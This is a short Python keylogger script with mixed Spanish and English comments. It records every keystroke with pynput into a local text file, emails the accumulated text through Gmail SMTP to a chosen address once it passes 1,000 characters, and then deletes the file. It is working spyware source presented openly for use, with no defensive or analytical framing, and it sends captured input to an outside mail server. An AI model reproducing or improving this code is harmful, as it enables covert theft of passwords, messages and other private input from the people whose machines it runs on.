# Keylogger
#Note you need to allow  the apps less secure in google
python
from pynput.keyboard import Listener,Controller,Key # Detect the Key
import smtplib # SEND THE MAIL
import subprocess # To use the terminal
def enviar(mensaje):
    if(len(mensaje)>1000):
        server=smtplib.SMTP('smtp.gmail.com',587)# Stablish the connection with the server
        server.starttls()# start the server
        server.login('Your mail','Your password')
        server.sendmail('your mail','mail destination',mensaje)
        server.quit()
        print('Todo bien')
        subprocess.call(['rm','Holas.txt'])# we remove the txt archive to create another one
    else:
        pass


def keyGrabation(key):
    key_str=str(key)
    with open('Holas.txt','a')as f: # we append the keyboard pulsation
        if(key_str=='Key.enter'):
            f.write('\n')
        elif(key_str=='Key.space'):
            f.write(' ')
        elif(key_str=='Key.backspace'):
            f.write(' Borrar ')
        else:
            f.write(key_str.replace("'",""))
    msj=open('Holas.txt','r')
    mensaje=msj.read()
    enviar(mensaje)

if __name__ == '__main__':#
    with Listener(on_press=keyGrabation) as l:# we create a listener that it is listening to the pultations
        l.join()
